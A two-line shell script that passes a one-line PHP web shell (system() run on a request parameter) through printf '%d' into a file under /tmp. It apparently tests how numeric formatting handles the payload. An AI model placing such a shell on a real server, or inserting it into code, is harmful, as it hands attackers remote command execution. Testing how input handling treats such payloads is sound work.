#!/bin/sh
printf '%d' '<?php system($_REQUEST["action"]);' > /tmp/numeric.php
